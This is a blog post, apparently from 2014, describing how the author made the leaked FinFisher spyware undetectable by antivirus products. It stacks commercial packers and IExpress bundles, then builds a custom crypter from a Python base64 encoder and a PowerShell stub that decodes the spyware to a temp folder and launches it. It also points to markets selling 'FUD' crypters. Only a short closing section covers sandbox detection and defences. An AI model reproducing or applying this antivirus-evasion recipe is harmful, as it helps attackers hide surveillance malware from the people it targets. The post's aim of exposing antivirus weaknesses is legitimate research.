@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en-US">
+    <head>
+        <meta charset="utf-8"> 
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="author" content="Roman Sinayev" />
+        <meta name="copyright" content="Roman Sinayev" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="modeling, malware, malware, " />
+
+<meta property="og:title" content="Making Finfisher Undetectable "/>
+<meta property="og:url" content="http://lqdc.github.io/making-finfisher-undetectable.html" />
+<meta property="og:description" content="Recently, Wikileaks revealed FinFisher, a program used by governemnts to spy on journalists. Although it is claimed on the page that the malware is “previously unreleased”, we know that antivirus (AV) companies knew about it for almost 4 years, because someone uploaded it to VirusTotal close to 4 years ago ..." />
+<meta property="og:site_name" content="lqdc blog" />
+<meta property="og:article:author" content="Roman Sinayev" />
+<meta property="og:article:published_time" content="2014-10-02T17:46:00-07:00" />
+<meta name="twitter:title" content="Making Finfisher Undetectable ">
+<meta name="twitter:description" content="Recently, Wikileaks revealed FinFisher, a program used by governemnts to spy on journalists. Although it is claimed on the page that the malware is “previously unreleased”, we know that antivirus (AV) companies knew about it for almost 4 years, because someone uploaded it to VirusTotal close to 4 years ago ...">
+
+        <title>Making Finfisher Undetectable  · lqdc blog
+</title>
+        <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css" rel="stylesheet">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="http://lqdc.github.io/theme/css/pygments.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="http://lqdc.github.io/theme/tipuesearch/tipuesearch.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="http://lqdc.github.io/theme/css/elegant.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="http://lqdc.github.io/theme/css/custom.css" media="screen">
+        <link href="http://lqdc.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="lqdc blog - Full Atom Feed" />
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+     (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+     m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+     })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-60488389-1', 'auto');
+    ga('send', 'pageview');
+</script>
+        <link rel="stylesheet" href="http://lqdc.github.io/css/finfisher.css" type="text/css" />
+    </head>
+    <body>
+        <div id="content-sans-footer">
+        <div class="navbar navbar-static-top">
+            <div class="navbar-inner">
+                <div class="container-fluid">
+                    <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </a>
+                    <a class="brand" href="http://lqdc.github.io/"><span class=site-name>lqdc blog</span></a>
+                    <div class="nav-collapse collapse">
+                        <ul class="nav pull-right top-menu">
+                            <li ><a href="http://lqdc.github.io">Home</a></li>
+                            <li ><a href="http://lqdc.github.io/categories.html">Categories</a></li>
+                            <li ><a href="http://lqdc.github.io/tags.html">Tags</a></li>
+                            <li ><a href="http://lqdc.github.io/archives.html">Archives</a></li>
+                            <li><form class="navbar-search" action="http://lqdc.github.io/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row-fluid">
+                <div class="span1"></div>
+                <div class="span10">
+<article>
+<div class="row-fluid">
+    <header class="page-header span10 offset2">
+    <h1><a href="http://lqdc.github.io/making-finfisher-undetectable.html"> Making Finfisher Undetectable  </a></h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset2 article-content">
+
+            
+            <p>Recently, <a href="https://wikileaks.org/spyfiles4/">Wikileaks revealed FinFisher</a>, a program used by governemnts to spy on journalists. Although it is claimed on the page that the malware is “previously unreleased”, we know that antivirus (AV) companies <strong>knew about it for almost 4 years</strong>, because someone uploaded it to VirusTotal close to 4 years ago:</p>
+<p><img alt="Finfisher Scan Date" src="http://lqdc.github.io/images/finfisher/ff_vt_ts.png" title="Finfisher Scan Date" /></p>
+<p>Since it’s been known as malware for so long, most antiviruses detect it as malicious:
+<img alt="vt of finfisher" src="http://lqdc.github.io/images/finfisher/finfisher_original.png" title="vt of finfisher" /></p>
+<p>Evading antivirus signatures, like those used on VirusTotal, is trivial. We will try to modify/obfuscate FinFisher so that it is neither detected by antiviruses on VirusTotal nor by two standalone products including <a href="http://us.norton.com/antivirus">Symantec Norton Antivirus 2014</a> and <a href="http://www.bitdefender.com/solutions/internet-security.html">BitDefender</a>.
+We want to test against standalone products because they may have more advanced detection strategies not employed by VirusTotal.
+These two antiviruses both <a href="http://www.pcmag.com/article2/0,2817,2460688,00.asp">1</a> <a href="http://www.pcmag.com/article2/0,2817,2424558,00.asp">2</a>
+got awards on PCMagazine, so we are not cheating with easy targets.</p>
+<p>Finally, we’ll go through some of the more advanced detection strategies that are less trivial for malware authors to bypass.</p>
+<h3>Obfuscating Malware</h3>
+<p>One strategy that antiviruses use to detect a malicious program is finding a small part of it that is integral to its function (i.e. a <a href="http://www.techopedia.com/definition/4158/virus-signature">virus signature</a>) that doesn’t appear in normal software. Then, they cross reference a database of such small patterns against the file contents, and if there is a match, the file is labeled as malware.</p>
+<p>However, it is not always easy or even possible to come up with a good signature/heuristic, because the viruses can mutate or because the malware authors can decide to obfuscate that specific part of the malware.</p>
+<p>Software packers can be used to make it difficult to come up with such a signature or heuristic, or to change an existing piece of malware in such a way that an antivirus signature no longer matches the malware.</p>
+<p>According to Wikipedia,</p>
+<blockquote>
+<p>Packers are wrappers put around pieces of software to compress and/or encrypt their contents
+</p>
+</blockquote>
+<p>Packers are widely used by legitimate software to hide implementation details, while retaining the function of the software. This is necessary when the author of the software doesn’t want others to copy/distribute/improve upon the software without permission.</p>
+<p>An example of such a legitimate use case is when a video game company releases a demo of a game. Instead of bothering to remove all the functionality from the game, the developers can just have one line statement within it that would check if the license is just a demo license and remove functionality if it is. If such a game company doesn’t bother with an obfuscator/packer, it would be very easy for an expert in reverse engineering to enable the full functionality.</p>
+<p>A very naive form of obfuscation/packing is zip compression.
+Here’s how a file with 100 lines of the word Hello looks on hexedit to a computer:
+<img alt="Plain 100 lines of hello" src="http://lqdc.github.io/images/finfisher/hello.png" title="Plain 100 lines of hello" /></p>
+<p>Here’s how the same file looks when zipped:</p>
+<p><img alt="Hello Zipped" src="http://lqdc.github.io/images/finfisher/hello_zipped.png" /></p>
+<p>It wouldn’t be obvious to a person unfamiliar with zip compression that the compressed text corresponds to the original 100 lines of “Hello”. Other packers don’t make this process easy at all, especially if the antivirus has not encountered the packer before.</p>
+<p>Here’s a landscape of the currently available off-the-shelf packers (taken from <a href="http://forensicmethods.com/executablepackers">http://forensicmethods.com/executablepackers</a>)
+<img alt="Current Packers" src="http://lqdc.github.io/images/finfisher/Packers.png" /></p>
+<h3>Commercial Legal packers and FUD (Fully UnDetectable) packers.</h3>
+<p>When a malware author wants to obfuscate malware, they would want to use the same strategies as someone using packers legitimately.</p>
+<p>One solution for a malware author is to use a commercial FUD malware packer. These are new packers that haven’t yet been seen by antiviruses and that can be used to package any malware so that it wouldn’t be detected by antiviruses. One can purchase these packers either on the open internet e.g. <a href="http://www.best-fud-crypters.com/">Best-Fud</a>, the operation of which is shown <a href="https://www.youtube.com/watch?v=cg5BP_2_ijc">here</a>.
+<strong>Please don’t try to use this packer. I have not tested it. It may contain malware itself.</strong></p>
+<p>Another solution is to go to a hidden services market such as Silk Road 2 and purchase a new FUD malware packer. Since the packer isn’t known to the AV companies ahead of time, they wouldn’t be able to come up with a good signature for it.</p>
+<p>A third solution is to simply buy a legitimate packer such as <a href="http://www.oreans.com/themida.php">Themeda</a>. This way it’s not malware authors battling antivirus vendors, where antivirus vendors are free to label the FUD crypter itself as malware, but the whole software obfuscation industry vs antivirus vendors, where labeling anything packed by the packer as malware is not an option. In fact, even the latest malware deobfuscation techniques <a href="http://www.covert.io/research-papers/security/Eureka%20-%20A%20framework%20for%20enabling%20static%20malware%20analysis.pdf">struggle</a> with some of the commercial packers.</p>
+<h3>Let’s get to it!</h3>
+<p>We’ll try to obfuscate/pack FinFisher, so that no antivirus detects it. We will try to only use free/demo versions of obfuscators, including the windows built in IExpress bundler, demo version of Themeda and demo version of VMProtect packer.</p>
+<p>To begin, let’s see where we stand with detection of the original file. We already saw the Virustotal results, but let’s see what the standalone packers say.</p>
+<p>Norton AV:
+<img alt="symantec finfisher" src="http://lqdc.github.io/images/finfisher/symantec_raw.png" /></p>
+<p>And by Bitdefender:
+<img alt="bitdefender raw" src="http://lqdc.github.io/images/finfisher/bitdefender_raw.png" /></p>
+<p>Yup, a known malicious 4 year old malware.</p>
+<p>First, let’s try to use IExpress to package the original FinFisher file downloaded from WikiLeaks. Here’s how to do it:</p>
+<p><img alt="iexpress demo" src="http://lqdc.github.io/images/finfisher/ParallelWiltedAcouchi.gif" /></p>
+<p>And after uploading the resulting file to VirusTotal, we get this result:
+<img alt="finfisher iexpress" src="http://lqdc.github.io/images/finfisher/finfisher_iexpress.png" /></p>
+<p>A little better, but all the common antiviruses still detect it. This includes Bitdefender standalone:</p>
+<p><img alt="BitDefender" src="http://lqdc.github.io/images/finfisher/bitdefender_iexpress.png" /></p>
+<p>However, NortonAV doesn’t:</p>
+<p><img alt="Norton IExpress" src="http://lqdc.github.io/images/finfisher/symantec_iexpress.png" /></p>
+<p>In other words, <strong>we can simply use a built-in Windows tool to modify malware to bypass a mainstream antivirus</strong>.</p>
+<p>However, we would like to keep going and try to sneak FinFisher by as many antiviruses as possible.</p>
+<p>Now, we’ll download Themida from its <a href="http://www.oreans.com/themida.php&quot;&gt;official site">official site</a> and use the demo version on our exe file with the default settings. This involves simply following through the menu options, so I will not show that here, but after packing, the standalone Bitdefender product doesn’t detect it:</p>
+<p><img alt="themida bitdefender" src="{filename}/images/finfisher/bitdefender_themeda.png" /></p>
+<p>And when we upload it to VirusTotal …
+<img alt="themida" src="http://lqdc.github.io/images/finfisher/finfisher_themida.png" /></p>
+<p>We are just left with 7. However, based on the malware names, it looks like at least some of the antiviruses are protesting against the Themida packer instead of the malware.</p>
+<p>Just to be sure, let’s package Windows Media Player with Themida and test the final product on VirusTotal:</p>
+<p><img alt="themida_wmp" src="http://lqdc.github.io/images/finfisher/wmplayer_themida.png" /></p>
+<p>So just packaging a non-trivial windows application with a commercial packer gets you flagged by a number of antiviruses. Bad news for people using Themida for legitimate purposes.</p>
+<p>Combining IExpress with Themida doesn’t result in much improvement over the plain Themida version, so I won’t show the results here.</p>
+<p>Now let’s try VMProtect demo version that you can get from <a href="http://vmpsoft.com/">here</a> on the same file:</p>
+<p><img alt="vmprotect" src="http://lqdc.github.io/images/finfisher/ff_vmp.png" /></p>
+<p>Looks like FinFisher is still detected inside. But what if we package the binary with IExpress followed by VMProtect?</p>
+<p><img alt="ff_ie_vmp" src="http://lqdc.github.io/images/finfisher/ff_ie_vmp.png" /></p>
+<p>(Almost) Success… Neither Symantec nor BitDefender standalone version detects our new packed malware.</p>
+<p>Let’s add an image to our file. We are doing this because we want to mess with file entropy, increase the file size and make it harder to figure out where the actual code is. Different antiviruses rely on some or all of these attributes when searching for patterns in the binary file.</p>
+<p>And after packaging them with IExpress and uploading to VT:</p>
+<p><img alt="ff-ie-vmp-ie" src="http://lqdc.github.io/images/finfisher/ff_ie_vmp_ie.png" /></p>
+<p>The users of Bkav should be really happy right now. But from this process we can already see that using multiple packers is an extremely easy to execute and effective strategy to avoid AV detection.</p>
+<p>Let’s not give up yet, though. What if we add all the built in Windows photos:</p>
+<p><img alt="default pics" src="http://lqdc.github.io/images/finfisher/default_pictures.png" /></p>
+<p>to the bundled exe? This is done for the same reasons we added one image.</p>
+<p>And…</p>
+<p>It worked:</p>
+<p><img alt="ff_ie_vmp_ie" src="http://lqdc.github.io/images/finfisher/ffievmpie.png" /></p>
+<p>So we bypassed all AV detection on VirusTotal, and also 2 of the top standalone products. We also didn’t have to do any programming at all. We simply used a demo version of a commercial packer and a built-in Windows utility.</p>
+<p>However, how hard would it be to create our own FUD packer to hide FinFisher, or any other malware for that matter?</p>
+<h3>Creating a custom FUD packer</h3>
+<p>Where do we start? Well, we saw with the ZIP example, that packed code looks very different from actual code. Although humans could figure out what the malware is doing, it is much harder to teach an antivirus to figure out how to determine whether something looks suspicious.</p>
+<p>Let’s try a very simple technique. It’s called <a href="http://en.wikipedia.org/wiki/Base64">Base64 encoding</a>. It corresponds to looking at numbers in base64 instead of our usual base10.</p>
+<p>Specifically, what we are going to do is read in <code>n</code> bytes at a time, convert them to base64, finish the line, read in <code>n</code> bytes again and so on until we write out the whole file in base64. Then we’re going to create an executable from a PowerShell file that reads in base 64 and converts it back to bytes… but only after a user executes it. In other words, no signature would be able to find the virus and a typical AV won’t be able to do anything until it is too late.</p>
+<h4>Part 0: Choosing the language to use:</h4>
+<p>I &lt;3 Python for scripting, so let’s try to write the packer in Python. Problem with Python is that it is not installed on Windows computers by default, so we need to make an exe file out of the Python script first.
+I used <a href="http://www.py2exe.org/">py2exe</a>.</p>
+<p>Python code for the actual file:</p>
+<div class="highlight"><pre><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">out_f_name</span> <span class="o">=</span> <span class="s">&#39;out_file.exe&#39;</span>
+</pre></div>
+
+
+<p>Almost nothing. Just a variable assignment. Then pack it with with the following code:</p>
+<div class="highlight"><pre><span class="kn">from</span> <span class="nn">distutils.core</span> <span class="k">import</span> <span class="n">setup</span>
+<span class="kn">import</span> <span class="nn">py2exe</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
+
+<span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;py2exe&#39;</span><span class="p">)</span>
+
+<span class="n">setup</span><span class="p">(</span>
+    <span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;py2exe&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#39;bundle_files&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;compressed&#39;</span><span class="p">:</span> <span class="k">True</span><span class="p">}},</span>
+    <span class="n">windows</span> <span class="o">=</span> <span class="p">[{</span><span class="s">&#39;script&#39;</span><span class="p">:</span> <span class="s">&quot;something.py&quot;</span><span class="p">}],</span>
+    <span class="n">zipfile</span> <span class="o">=</span> <span class="k">None</span><span class="p">,</span>
+<span class="p">)</span>
+</pre></div>
+
+
+<p>And test the resulting file on VirusTotal:</p>
+<p><img alt="py2exe" src="http://lqdc.github.io/images/finfisher/py2exe.png" /></p>
+<p>Ok, looks like we’re stuck getting detected even with a benign “hello world” program. Anyone who writes any program in Python and wants to make an installer with one of the most popular executable file generators is going to have their creation be labled as a virus by one of the AVs. We also see that just because something is labeled as malicious by one AV, it doesn’t necessarily mean that it is a virus.</p>
+<p>Going through the same process with PowerShell and <a href="http://ps2exe.codeplex.com/">PS2EXE</a>, I got no false positives, so we’ll use PowerShell.</p>
+<h4>Part I: Converting to base64</h4>
+<p>This process is very simple in Python. Here’s the code:</p>
+<div class="highlight"><pre><span class="kn">from</span> <span class="nn">base64</span> <span class="k">import</span> <span class="n">b64encode</span>
+
+<span class="n">f_name1</span> <span class="o">=</span> <span class="s">r&#39;C:\Users\John\Desktop\finfisher.1.exe&#39;</span>
+<span class="n">f_name2</span> <span class="o">=</span> <span class="s">r&#39;C:\Users\John\Desktop\finfisher_lines.b64&#39;</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">f_name1</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">f_name2</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">f2</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span><span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</pre></div>
+
+
+<p>We read in from <code>finfisher.1.exe</code>, which is our malware, and convert to <code>finfisher_lines.b64</code>, which is the same file encoded to base64 5 bytes at a time.</p>
+<h4>Part II: Converting back to binary and executing</h4>
+<p>Since we are in Windows land, we will have to use Windows tools for our packer.</p>
+<p>PowerShell to the rescue:</p>
+<div class="highlight"><pre>$data = Get-Content &quot;finfisher_lines.b64&quot;
+$vname = &#39;C:\Windows\Temp\finfisher.exe&#39;
+$s_o = new-object System.IO.FileStream($vname, [IO.FileMode]::Create, [IO.FileAccess]::Write,  [IO.FileShare]::None)
+foreach ($line in $data) {
+    $l = [System.Convert]::FromBase64String($line)
+    $s_o.Write($l, 0, $l.Length)
+
+}
+$s_o.close()
+Invoke-Item $vname
+</pre></div>
+
+
+<p>All we’re doing here is decoding from base64 and executing the resulting binary.</p>
+<p>To make this PowerShell script into a binary, we’ll use PS2EXE with the following command</p>
+<div class="highlight"><pre>.\ps2exe.ps1 -verbose -inputFile C:\bin_writer.psl C:\final_bin.exe
+</pre></div>
+
+
+<p>After this we still have two files: <code>final_bin.exe</code> and <code>finfisher_lines.b64</code>
+that it consumes. To make one file, we just run IExpress again to bundle them together and submit to VirusTotal:</p>
+<p><img alt="custom_1" src="http://lqdc.github.io/images/finfisher/ff_custom1.png" /></p>
+<p>Bkav again fighting a good fight.</p>
+<p>Let’s trick it by doing the same thing we did with commercial packers - add some images to the file.</p>
+<p>After adding the images, let’s upload to VirusTotal again:
+<img alt="custom_2" src="http://lqdc.github.io/images/finfisher/final_bin_custom_2.png" /></p>
+<p>Success! We now have a FUD packer.</p>
+<div id="chart"></div>
+
+<h3>To Review</h3>
+<p>We first encoded the original binary into base64, then we wrote a PowerShell script that reads the b64 file and converts it to back to binary file and launches it. Then we bundled the two files together using IExpress.</p>
+<p><strong>Almost any Windows malware can be packed and be rendered undetectable using this or similar strategy</strong> with small variations.</p>
+<h3>Sandbox analysis - an alternative detection strategy</h3>
+<p>Although virus signatures is a useful tool for malware detection, antiviruses should not rely on it to such an extent. Users should have an option for more thorough file analysis, especially when they’re very suspicious of a specific file. The only solution that could have worked in this case is sandbox analysis.</p>
+<p>Sandbox analysis works by running suspicious programs in an isolated enviornment and attempting to observe all activities the program partakes in. In cases where the program tries to perform suspicious activities such as recording keystrokes or connecting to known malicious domains, it would be marked as malicious. Packers would have no effect on this, because packing happens before execution. The program would still perform
+the same malicious activities, triggering detection by the sandbox. In our case, no matter how much we pack it, FinFisher would remain FinFisher.</p>
+<p>A major downside of this strategy is computational cost. Antiviruses already tax the system they are installed on just by cross-referencing the contents of the binary against their signature databse. A separate virtual machine that acts as a sandbox may effectively double the computatinal cost of the plain system. If we assume AVs' current model of running analysis on the user's machine, this overhead may prohibitive.</p>
+<p>One way to not annoy the users with the overhead and still use sandbox analysis is for the AV companies to send all the binaries to the cloud, which has its own downside of network bandwidth overhead, especially for large files.</p>
+<p>Another way is for system administrators to install a network security platform that forks binaries traffic, analyses them in a sandbox and then quarantines the affected user if malicious behavior is detected.</p>
+<p>As long as sandbox analysis is not implemented by the best AVs, journalists, activists and political dissidents are in danger of being infected with different versions of the same malware that are trivial to generate.</p>
+<h3>What can be done to stop packer-backed malware proliferation?</h3>
+<p>Users:</p>
+<ul>
+<li>Power users can browse the internet from within a Virtual Machine (VM). Thus their main system / other VMs would not get infected and sensitive information would not be stolen.</li>
+<li>Do not execute files of unknown origin.</li>
+</ul>
+<p>System Administrators</p>
+<ul>
+<li>Install and use a network security platform that monitors the network for malicious binaries/traffic and quarantines affected users.</li>
+<li>Educate users about not downloading malicious attachments from emails. This would not stop users from being infected with droppers.</li>
+<li>Block potentially compromised web sites that may host droppers that can launch such executables.</li>
+<li>Allow only specific programs to run via Local Group Policy settings. An example of this is shown <a href="http://www.sevenforums.com/tutorials/257189-applications-run-only-specified-programs-windows.html">here</a>.</li>
+</ul>
+<h3>TL;DR</h3>
+<p>We can easily combine a few free tools or create a custom packer to pack FinFisher or other well-known malware to make it undetectable by current antiviruses. Sandbox analysis can be an effective strategy in defending against packers.</p>
+<pre id="csvdata">packer,frequency
+Original,43
+IExpress,24
+Themida,7
+VMP,13
+IE/VMP,2
+IE/VMP/IE,1
+IE/VMP/IE + Pics,0
+Python + py2exe,1
+PS,1
+PS + Pics,0
+</pre>
+            
+            <section>
+<div class="accordion" id="accordion2">
+    <div class="accordion-group">
+        <div class="accordion-heading">
+            <a class="accordion-toggle disqus-comment-count" data-toggle="collapse" data-parent="#accordion2"
+                href="http://lqdc.github.io/making-finfisher-undetectable.html#disqus_thread">
+                Comments
+            </a>
+        </div>
+        <div id="disqus_thread" class="accordion-body collapse">
+            <div class="accordion-inner">
+                <div class="comments">
+                    <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'codellama';
+        var disqus_identifier = 'http://lqdc.github.io/making-finfisher-undetectable.html';
+    var disqus_url = 'http://lqdc.github.io/making-finfisher-undetectable.html';
+
+    (function() {
+         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+         dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+     })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</section>
+
+            <hr/>
+        </div>
+        <section>
+        <div class="span2" style="float:right;font-size:0.9em;">
+            <h4>Published</h4>
+            <time pubdate="pubdate" datetime="2014-10-02T17:46:00-07:00">Oct 2, 2014</time>
+            <h4>Category</h4>
+            <a class="category-link" href="http://lqdc.github.io/categories.html#malware-ref">malware</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="http://lqdc.github.io/tags.html#malware-ref">malware
+                    <span>3</span>
+</a></li>
+                <li><a href="http://lqdc.github.io/tags.html#modeling-ref">modeling
+                    <span>2</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+    <a href="http://github.com/lqdc" title="My github Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-github sidebar-social-links"></i></a>
+    <a href="http://rsinayev.com" title="My home Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-home sidebar-social-links"></i></a>
+        </div>
+        </section>
+</div>
+</article>
+                </div>
+                <div class="span1"></div>
+            </div>
+        </div>
+        <div id="push"></div>
+    </div>
+<footer>
+<div id="footer">
+    <ul class="footer-content">
+        <li class="elegant-power">Powered by <a href="http://getpelican.com/" title="Pelican Home Page">Pelican</a>. Theme: <a href="http://oncrashreboot.com/pelican-elegant" title="Theme Elegant Home Page">Elegant</a> by <a href="http://oncrashreboot.com" title="Talha Mansoor Home Page">Talha Mansoor</a></li>
+    </ul>
+</div>
+</footer>            <script src="http://code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+            <script type="text/javascript">
+var disqus_shortname = 'codellama';
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+<script  language="javascript" type="text/javascript">
+function uncollapse() {
+    if (window.location.hash.match(/^#comment-\d+$/)) {
+        $('#disqus_thread').collapse('show');
+    }
+}
+</script>
+<script type="text/javascript" language="JavaScript">
+uncollapse();
+window.onhashchange=function(){
+    if (window.location.hash.match(/^#comment-\d+$/))
+        window.location.reload(true);
+}
+</script>
+<script>
+$('#disqus_thread').on('shown', function () {
+    var link = document.getElementsByClassName('accordion-toggle');
+    var old_innerHTML = link[0].innerHTML;
+    $(link[0]).fadeOut(500, function() {
+        $(this).text('Click here to hide comments').fadeIn(500);
+    });
+    $('#disqus_thread').on('hidden', function () {
+        $(link[0]).fadeOut(500, function() {
+            $(this).text(old_innerHTML).fadeIn(500);
+        });
+    })
+})
+</script>
+
+
+    </body>
+    <script src="http://d3js.org/d3.v3.min.js"></script>
+    <script src="http://lqdc.github.io/js/finfisher.js"></script>
+    <!-- Theme: Elegant built for Pelican
+    License : http://oncrashreboot.com/pelican-elegant -->
+</html>
